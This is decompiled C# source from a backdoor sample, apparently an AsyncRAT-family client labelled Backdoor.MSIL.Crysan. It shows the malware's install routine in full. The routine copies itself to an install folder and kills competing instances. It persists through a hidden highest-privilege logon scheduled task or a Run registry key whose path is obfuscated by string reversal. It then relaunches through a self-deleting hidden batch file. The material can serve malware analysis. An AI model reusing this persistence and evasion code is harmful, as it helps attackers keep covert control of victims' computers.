// Decompiled with JetBrains decompiler
// Type: Client.Install.NormalStartup
// Assembly: AsyncClient, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A19C81AD-DCA7-4942-AD7B-C0D73F667431
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\Backdoor.MSIL.Crysan.ecy-9f340084a105595091444c4fe491dcb4cee297c296812165dcbe4f23579fff1a.exe

using Client.Helper;
using Microsoft.VisualBasic;
using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace Client.Install
{
  internal class NormalStartup
  {
    public static void Install()
    {
      try
      {
        FileInfo fileInfo = new FileInfo(Path.Combine(Environment.ExpandEnvironmentVariables(Settings.InstallFolder), Settings.InstallFile));
        string fileName = Process.GetCurrentProcess().MainModule.FileName;
        if (!(fileName != fileInfo.FullName))
          return;
        foreach (Process process in Process.GetProcesses())
        {
          try
          {
            if (process.MainModule.FileName == fileInfo.FullName)
              process.Kill();
          }
          catch
          {
          }
        }
        if (Methods.IsAdmin())
        {
          Process.Start(new ProcessStartInfo()
          {
            FileName = "cmd",
            Arguments = "/c schtasks /create /f /sc onlogon /rl highest /tn \"" + Path.GetFileNameWithoutExtension(fileInfo.Name) + "\" /tr '\"" + fileInfo.FullName + "\"' & exit",
            WindowStyle = ProcessWindowStyle.Hidden,
            CreateNoWindow = true
          });
        }
        else
        {
          using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(Strings.StrReverse("\\nuR\\noisreVtnerruC\\swodniW\\tfosorciM\\erawtfoS"), RegistryKeyPermissionCheck.ReadWriteSubTree))
            registryKey.SetValue(Path.GetFileNameWithoutExtension(fileInfo.Name), (object) ("\"" + fileInfo.FullName + "\""));
        }
        if (File.Exists(fileInfo.FullName))
        {
          File.Delete(fileInfo.FullName);
          Thread.Sleep(1000);
        }
        FileStream fileStream = new FileStream(fileInfo.FullName, FileMode.CreateNew);
        byte[] numArray = File.ReadAllBytes(fileName);
        byte[] buffer = numArray;
        int length = numArray.Length;
        fileStream.Write(buffer, 0, length);
        Methods.ClientOnExit();
        string path = Path.GetTempFileName() + ".bat";
        using (StreamWriter streamWriter = new StreamWriter(path))
        {
          streamWriter.WriteLine("@echo off");
          streamWriter.WriteLine("timeout 3 > NUL");
          streamWriter.WriteLine("START \"\" \"" + fileInfo.FullName + "\"");
          streamWriter.WriteLine("CD " + Path.GetTempPath());
          streamWriter.WriteLine("DEL \"" + Path.GetFileName(path) + "\" /f /q");
        }
        Process.Start(new ProcessStartInfo()
        {
          FileName = path,
          CreateNoWindow = true,
          ErrorDialog = false,
          UseShellExecute = false,
          WindowStyle = ProcessWindowStyle.Hidden
        });
        Environment.Exit(0);
      }
      catch (Exception ex)
      {
      }
    }
  }
}
